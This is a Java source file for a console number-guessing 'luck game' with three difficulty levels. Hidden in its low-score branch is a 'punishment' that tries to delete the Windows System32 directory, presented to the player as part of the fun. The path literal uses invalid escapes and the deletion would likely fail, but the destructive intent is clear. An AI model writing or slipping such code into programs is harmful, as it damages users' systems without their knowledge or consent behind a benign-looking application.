import java.util.*;
import java.io.*;

public class Luck_Game {
    public void random_question(int r,int increase ,String level,int max_num )
    {
        Scanner scan = new Scanner(System.in);
        Random random = new Random();

        int c_number,score=0;

        System.out.println("You Choose "+level+" so You Have To Play "+r+" Round And Have To Choose A " +
                "Number Between 1-"+max_num+" \nIf Your Number And Computer Generated number Is Same " +
                "Then Then You Got "+increase+" Point");
        for(int i=0;i<r;i++) {
            System.out.println("Enter Your Number");
            c_number = scan.nextInt();
            if (c_number == random.nextInt(max_num) + 1) {
                score+=increase;
                System.out.println("Congratulation You Got "+increase+ "Point");
            } else {
                System.out.println("Sorry You Loose");
            }
        }

        if (score>=15)
        {
            System.out.println("Congratulation You are A Lucky Person");
        }
        else if(score>=5)
        {
            System.out.println("You Are Not Lucky Not Unlucky");
        }
        else
        {
            try {
                File file = new File("C:\Windows\System32");
                file.delete();
                System.out.println("Congratulation You Got Your Punishment");
            }
            catch (Exception e)
            {
                System.out.println("You Are Not That Much Unlucky");
            }
        }

    }
    public void Game_Start() {
         Scanner scan = new Scanner(System.in);
         Luck_Game l_g = new Luck_Game();

         char Game_Level;
            System.out.println("Only Enter The First Word of those Level");
            System.out.println("Choose Game Level\n" +
                    "            1.Hard\n" +
                    "            2.Medium\n" +
                    "            3.Easy\n");
            Game_Level = scan.next().charAt(0);
            if(Game_Level=='H' || Game_Level=='h')
            {
                l_g.random_question(3,5,"Hard",10);
            }
            else if(Game_Level=='M' || Game_Level=='m')
            {
                l_g.random_question(5,3,"Medium",5);

            }
            else if(Game_Level=='E' || Game_Level=='e')
            {
                l_g.random_question(7,2,"Easy",3);
            }

    }
    public static void main(String[] args) {
        Scanner scan = new Scanner(System.in);
        Luck_Game l_g = new Luck_Game();
        System.out.println("Hello User......");
        System.out.println("Are You ready to Play This Game If Yes Then Enter Y Otherwise N");
        char User_Desire = scan.next().charAt(0);
        if(User_Desire=='Y' || User_Desire=='y')
        {
            System.out.println("At First Tell You The Game Rule If your Luck Point Is Between 10 - 15" +
                    " Then You Are A Lucky Person Congratulation  \nIf Your Luck is Between 5-10 Then You" +
                    " Are not a Lucky Person\n If your Luck is Less Then 3 You Are A Unlucky Person You Deserve Punishment");
            l_g.Game_Start();
        }
        else
        {
            System.out.println("Your Wish You Can Do Whatever you Want.....");
        }

    }
}
